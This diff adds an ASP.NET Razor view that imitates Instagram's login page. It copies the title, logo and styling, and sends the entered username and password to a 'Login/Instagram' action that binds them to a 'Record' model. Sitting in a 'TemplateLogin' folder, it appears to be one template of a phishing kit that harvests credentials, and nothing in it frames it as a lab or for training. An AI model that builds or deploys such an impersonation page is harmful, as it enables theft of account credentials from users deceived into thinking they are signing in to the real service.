@@ -1,0 +1,32 @@
+﻿@model Record
+<html>
+<head>
+    <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet">
+    <link href="~/TemplateLogin/Instagram/instagram-style.css" rel="stylesheet" />
+    <title>Instagram</title>
+</head>
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="~/TemplateLogin/Instagram/instagram-image-1.png" style="margin-bottom:10px;" />
+            </div>
+            <div class="l-part">
+                <form asp-controller="Login" asp-action="Instagram" method="post" enctype="multipart/form-data">
+                    <input type="text" asp-for="Username" placeholder="Username" class="input-1" />
+                    <div class="overlap-text">
+                        <input type="password" asp-for="Password" placeholder="Password" class="input-2" />
+                        <a href="#">Forgot?</a>
+                    </div>
+                    <input type="submit" value="Log in" class="btn" />
+                </form>
+</div>
+        </div>
+        <div class="sub-content">
+            <div class="s-part">
+                Don't have an account? <a href="#"> Sign up</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
